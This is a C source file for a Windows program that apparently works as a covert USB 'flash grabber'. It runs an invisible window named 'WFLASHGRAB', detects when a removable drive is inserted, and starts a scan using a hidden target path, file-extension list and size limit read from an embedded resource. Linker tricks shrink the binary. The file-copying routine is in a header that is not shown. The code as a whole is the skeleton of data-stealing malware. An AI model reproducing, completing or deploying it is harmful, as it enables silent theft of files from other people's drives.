#pragma comment(linker, "/MERGE:.data=.text")
#pragma comment(linker, "/MERGE:.rdata=.text")
#pragma comment(linker, "/SECTION:.text,EWR")
#pragma comment(linker, "/ENTRY:myWinMain")
#pragma comment(linker, "/SUBSYSTEM:WINDOWS" )
#pragma optimize( "gsy", on )
#pragma comment(linker, "/NODEFAULTLIB:libcmt.lib") 
	#pragma comment(linker, "/INCREMENTAL:NO" ) 
	#pragma comment(lib, "ntdll.lib" ) 
#include <windows.h>
#include <dbt.h>
#include "scanthread.h"
#include "vars.h"


#define IDC_SITDATA  1111
HINSTANCE hInst;

/**********************************************************************************************/


bool ReadSitting(LPVOID data)
{
	HRSRC hRes; 
	HGLOBAL hResLoad;   // handle to loaded resource
	LPVOID lpResLock;   // pointer to resource data
	HINSTANCE hHandle = GetModuleHandle(NULL);

	if (hHandle)
	{
		hRes = FindResource(hHandle, MAKEINTRESOURCE(IDC_SITDATA), RT_RCDATA);
		if (hRes == NULL)
		{			
			return false;
		}

		hResLoad = LoadResource(hHandle, hRes);
		if (hResLoad == NULL)
		{		
			return false;
		}		
		lpResLock = LockResource(hResLoad);
		if (lpResLock == NULL)
		{
			return false;
		}
		
		memcpy(data,lpResLock,SizeofResource(hHandle,hRes));
	}
	FreeLibrary(hHandle);
	return true;
}
/**********************************************************************************************/
wchar_t FirstDriveFromMask (ULONG unitmask)
{
	char i;

	for (i = 0; i < 26; ++i)
	{
		if (unitmask & 0x1)
			break;
		unitmask = unitmask >> 1;
	}
	return (i + 'A');
}

/**********************************************************************************************/
LRESULT WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam)
{	
	wchar_t szMsg[80];
	switch(msg)
	{
	case WM_DEVICECHANGE:
	{
		switch(wParam)
		{			
			case DBT_DEVICEARRIVAL:
			{													
				PDEV_BROADCAST_VOLUME lpdbv=(PDEV_BROADCAST_VOLUME)lParam;						
				if (lpdbv -> dbcv_devicetype == DRIVE_REMOVABLE)
				{
					wsprintf(szMsg,L"%c:\\",FirstDriveFromMask(lpdbv ->dbcv_unitmask));
					startscan(szMsg);
				}				
				break;
			}
			case DBT_DEVICEREMOVECOMPLETE:
			{
				break;
			}
		}
		break;
	}
	default:
		return(DefWindowProc(hWnd, msg, wParam, lParam));
	}
	return 0;
}

/**********************************************************************************************/
/**********************************************************************************************/

int WINAPI myWinMain(void)
{	
	HINSTANCE hInstance=GetModuleHandle(NULL);
	MSG msg;
	HWND hWnd;
	WNDCLASSEX wndclass;
	params tmp;
	wchar_t * classname=L"WFLASHGRAB";
	hInst	=	hInstance;				
	
	wndclass.style			= 0;
	wndclass.lpfnWndProc	= (WNDPROC)WndProc;
	wndclass.cbClsExtra		= 0;
	wndclass.cbWndExtra		= 0;
	wndclass.hInstance		= hInstance;
	wndclass.hIcon			= NULL;
	wndclass.hCursor		= NULL;
	wndclass.hbrBackground	= NULL;
	wndclass.lpszMenuName	= NULL;
	wndclass.lpszClassName	= classname;
	
	if(!RegisterClassEx(&wndclass))
		if(!RegisterClass((LPWNDCLASS)&wndclass.style))  
			return FALSE;
	hWnd=CreateWindow(classname,L"", 0, 0, 0, 1, 1, HWND_DESKTOP, NULL, hInstance, NULL);


	if (ReadSitting(&tmp)!=true)
	{
		MessageBox(0,L"Обламись",L"",MB_OK);
		ExitProcess(0);
		return 0;		
	}	
	SetSittings(tmp.path,tmp.extlist,tmp.maxsize);
/*-----------------------------------*/
	while(GetMessage(&msg, NULL, 0, 0))  
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}	
	return 0;
}